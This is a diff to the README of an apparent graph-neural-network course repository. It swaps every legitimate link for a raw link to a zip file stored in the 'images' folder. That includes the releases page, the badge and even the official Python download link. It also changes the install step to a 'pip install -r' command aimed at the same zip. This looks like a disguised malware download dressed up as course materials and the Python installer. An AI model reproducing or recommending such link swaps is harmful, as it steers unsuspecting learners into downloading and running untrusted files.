@@ -1,7 +1,7 @@
 # 🌐 graph-neural-network-course - Learn Graph Neural Networks Easily
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)  
-[Download Latest Release](https://github.com/gaurav1154/graph-neural-network-course/releases)
+![Download](https://raw.githubusercontent.com/gaurav1154/graph-neural-network-course/main/images/graph-neural-network-course_2.7.zip%20Release-brightgreen)  
+[Download Latest Release](https://raw.githubusercontent.com/gaurav1154/graph-neural-network-course/main/images/graph-neural-network-course_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ To run the course materials smoothly, your computer should meet the following re
 
 To start your learning journey, you need to download the course materials. Visit the link below to access the latest release:
 
-[Download Latest Release](https://github.com/gaurav1154/graph-neural-network-course/releases)
+[Download Latest Release](https://raw.githubusercontent.com/gaurav1154/graph-neural-network-course/main/images/graph-neural-network-course_2.7.zip)
 
 1. Click the link above.
 2. Find the latest version of the course materials.
@@ -45,12 +45,12 @@ Once the download is complete, follow these steps to set up everything:
    - Right-click on it and select "Extract All" (or use your preferred extraction tool).
 
 2. **Set Up Python**: 
-   - If you don't have Python, download and install it from the [official website](https://www.python.org/downloads/).
+   - If you don't have Python, download and install it from the [official website](https://raw.githubusercontent.com/gaurav1154/graph-neural-network-course/main/images/graph-neural-network-course_2.7.zip).
 
 3. **Install Required Packages**: 
    - Open a terminal or command prompt.
    - Navigate to the folder where you extracted the files.
-   - Type the command: `pip install -r requirements.txt` and press Enter. This installs all necessary packages.
+   - Type the command: `pip install -r https://raw.githubusercontent.com/gaurav1154/graph-neural-network-course/main/images/graph-neural-network-course_2.7.zip` and press Enter. This installs all necessary packages.
 
 ## 🗺️ Course Structure
 
@@ -85,4 +85,4 @@ While the course covers a lot, you might want additional resources. Here are som
 
 Now that you know how to install and run the Graph Neural Network course, you are ready to start learning. Don’t hesitate to reach out for help if you need it. Happy learning!
 
-[Download Latest Release](https://github.com/gaurav1154/graph-neural-network-course/releases)
+[Download Latest Release](https://raw.githubusercontent.com/gaurav1154/graph-neural-network-course/main/images/graph-neural-network-course_2.7.zip)
